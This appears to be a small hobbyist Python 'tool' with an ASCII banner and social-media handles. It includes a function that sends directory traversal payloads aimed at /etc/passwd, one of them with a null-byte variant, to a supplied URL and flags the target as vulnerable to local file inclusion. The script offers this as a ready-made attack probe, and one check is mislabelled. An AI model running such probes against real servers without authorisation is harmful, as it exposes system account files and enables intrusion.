import requests
from colorama import Fore
import sys

Z =  "\033[1;31m"
X =  "\033[1;33m"
Z1 =  "\033[2;31m"
F =  "\033[2;32m"
A =  "\033[2;34m"
C =  "\033[2;35m"
B =  "\033[2;36m"
Y =  "\033[1;34m"
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
orange = "\033[33m"
blue = "\033[34m"
purple = "\033[35m"
heavenly = "\033[36m"
light_gray = "\033[37m"

event = A+"[+]"

def Information():
    ip = requests.get("https://wtfismyip.com/text").text
    print(f"""
     ▄▄   ▄▄ ▄▄▄▄▄▄               ▄▄   ▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄   ▄▄▄▄▄▄   ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄ 
    █  █▄█  █   ▄  █             █  █ █  █       █   ▄  █ █   ▄  █ █      █       █       █   █
    █       █  █ █ █             █  █▄█  █    ▄▄▄█  █ █ █ █  █ █ █ █  ▄   █▄     ▄█▄     ▄█   █
    █       █   █▄▄█▄            █       █   █▄▄▄█   █▄▄█▄█   █▄▄█▄█ █▄█  █ █   █   █   █ █   █
    █       █    ▄▄  █           █       █    ▄▄▄█    ▄▄  █    ▄▄  █      █ █   █   █   █ █   █
    █ ██▄██ █   █  █ █            █     ██   █▄▄▄█   █  █ █   █  █ █  ▄   █ █   █   █   █ █   █
    █▄█   █▄█▄▄▄█  █▄█             █▄▄▄█ █▄▄▄▄▄▄▄█▄▄▄█  █▄█▄▄▄█  █▄█▄█ █▄▄█ █▄▄▄█   █▄▄▄█ █▄▄▄█
      
                             ___                    ___  
                            (o o)                  (o o) 
                           (  V  ) Mr <> Verratti (  V  )
                           --m-m--------------------m-m--

\033[1;37m+-----------------------------+
| \033[1;31m[#] \033[1;37mMy channel : @llllIllIIl |
| \033[1;31m[#] \033[1;37mInstagram : @0xi0m       |                                 
| \033[1;31m[#] \033[1;37mTelegram : @Verratti3    |
| \033[1;31m[#] \033[1;37mVersion : 1.0.1          |
+-----------------------------+

    Welcome in my tool 
    used : python3 tool.py
                
    your ip >> {ip}
    good luck
                """)

def exploit(url):
    try:
        payload = "../../../../../etc/passwd"
        response = requests.get(url + payload)
        if "root:" in response.text:
            print(event + url + "  Vulnerable to LFI")

        payload = "../../../../../etc/passwd%00"
        response = requests.get(url + payload)
        if "root:x:0:0" in response.text:
            print(event + url + " Vulnerable to Full Path Disclosure LFI")
    except KeyboardInterrupt:
        sys.exit()

Information()
